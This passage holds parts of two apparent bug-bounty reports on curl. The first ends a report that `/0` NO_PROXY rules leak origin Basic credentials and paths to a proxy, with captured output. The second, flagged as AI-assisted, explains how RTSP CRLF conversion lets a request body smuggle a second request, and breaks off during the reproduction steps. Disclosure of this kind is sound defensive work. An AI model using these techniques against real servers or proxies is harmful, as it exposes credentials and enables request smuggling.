4. Expected: the `/0` rules send IP-literal requests directly to their origins, while the mixed rule still proxies the named host. Observed: both `/0` IP-literal requests reach the proxy with an absolute-form request target and origin Basic credentials; the `/1` controls reach their origins directly and the named host remains proxied. One local run included:

   ```text
   NO_PROXY=0.0.0.0/0: reached proxy, including origin Basic credentials
   GET http://127.0.0.1:58653/private HTTP/1.1
   Authorization: Basic ZGVtbzpzZWNyZXQ=
   NO_PROXY=0.0.0.0/1: reached origin directly (control)
   NO_PROXY=::/0: reached proxy, including origin Basic credentials
   NO_PROXY=::/1: reached IPv6 origin directly (control)
   ```

The source explains the result: `lib/proxy.c:166,175-189` gives a bare address and an explicit `/0` the same `bits = 0` value; `cidr4_match()` at lines 72-86 treats zero as an exact-address comparison, and `cidr6_match()` at lines 101-103 changes zero to 128 bits. The ZIP includes the complete PoC, line-numbered source and documentation excerpts, and the captured local run.

## Impact

## Summary:
When a caller uses `/0` to keep IP-literal destinations off a configured HTTP proxy while still proxying named hosts, curl can instead send the proxy an absolute-form HTTP request target including its path, plus origin `Authorization` credentials supplied with `--user`. The proxy or its logs can therefore receive paths and credentials intended only for the origin. This requires an explicit `/0` rule, a configured proxy, and a sensitive plain-HTTP request; a conventional HTTPS CONNECT proxy does not see origin headers inside TLS without interception. Suggested severity: Low.
{F6991259}

title: libcurl RTSP `CURLOPT_CRLF` conversion allows a request body to become a second RTSP request
vulnerability_information:
# AI WAS USED IN THE PROCESS OF IDENTIFYING THIS VULNERABILITY.
## The vulnerability was tested manually and the report was carefully read.

# Suggested severity

Low

# Affected version

curl 8.23.0, tag `curl-8_23_0`, commit
`3163ec065643ba20709f190111f42c3e1fe95273`.

# Affected interface

The issue is reachable through the libcurl API. It is not directly reachable
through the curl command-line frontend because the tool does not expose
`CURLOPT_RTSP_REQUEST`. In particular, `-X ANNOUNCE` sets
`CURLOPT_CUSTOMREQUEST`; it does not select `CURL_RTSPREQ_ANNOUNCE`.

# Summary

For RTSP ANNOUNCE, SET_PARAMETER, and GET_PARAMETER uploads, libcurl sends a
`Content-Length` based on the raw input size. If `CURLOPT_CRLF` is enabled,
libcurl then expands bare LF bytes while transmitting the body but does not
update or reject the now-unknown length.

The server reads only the declared body length. The remaining bytes can form a
second RTSP request on the same connection.

This appears to be the RTSP sibling of CVE-2026-87864. Its fix changed IMAP
APPEND to consult `Curl_creader_total_length()` after the reader stack was
created and reject CRLF conversion when the final size is unknown. The RTSP
path still uses its pre-conversion `req_clen`.

# Root cause

In `lib/rtsp.c`, `rtsp_setup_body()` does the following:

```c
req_clen = data->state.infilesize;
result = Curl_creader_set_fread(data, req_clen);
...
curlx_dyn_addf(reqp, "Content-Length: %" FMT_OFF_T "\r\n", req_clen);
```

`Curl_creader_set_fread()` installs the generic CRLF conversion reader when
`data->set.crlf` is true. That reader's `cr_lc_total_length()` correctly
returns `-1`, but RTSP does not query it after reader construction.

# Reproduction

I used the attached `rtsp-crlf-framing.c` with a one-shot loopback RTSP
listener. The client constructs a body containing `K` bare LF bytes followed
